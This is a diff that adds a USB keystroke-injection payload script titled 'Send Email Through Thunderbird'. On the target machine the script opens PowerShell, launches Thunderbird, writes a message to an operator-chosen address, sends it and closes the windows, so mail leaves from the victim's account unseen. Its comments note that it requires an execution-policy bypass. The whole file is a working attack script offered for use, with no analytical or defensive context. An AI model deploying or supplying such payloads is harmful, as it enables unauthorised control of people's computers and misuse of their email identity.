@@ -1,0 +1,64 @@
+REM ########################################################
+REM #                                                      |
+REM # Title        : Send Email Through Thunderbird        |
+REM # Author       : Aleff                                 |
+REM # Version      : 1.0                                   |
+REM # Category     : Execution                             |
+REM # Target       : Windows 10/11 - Linux(debian tested)  |
+REM #                                                      |
+REM ########################################################
+
+
+REM Requirements:
+REM     - Internet Connection
+REM     - Thunderbird installed and email configured
+REM     - ExecutionPolicy Bypass (for Windows target)
+
+REM This payload is tested on:
+REM     - Ubuntu 23.04
+REM     - Windows 11
+
+REM REQUIRED - Set receiver email address
+DEFINE EMAIL-ADDRESS example@change-it.org
+
+REM REQUIRED - Set email Subject
+DEFINE SUBJECT example
+
+REM REQUIRED - Set email message
+DEFINE MESSAGE example
+
+
+REM # PowerShell
+DELAY 1000
+GUI r
+DELAY 1000
+STRING powershell
+ENTER
+DELAY 2000
+STRINGLN Start-Process "thunderbird.exe"
+DELAY 4000
+
+REM # Thunderbird
+CTRL n
+DELAY 2000
+STRING EMAIL-ADDRESS
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+STRING SUBJECT
+DELAY 500
+TAB
+DELAY 500
+STRING MESSAGE
+DELAY 500
+CTRL ENTER
+DELAY 2000
+ENTER
+
+REM # End actions
+DELAY 2000
+ALT F4
+DELAY 1000
+ALT F4
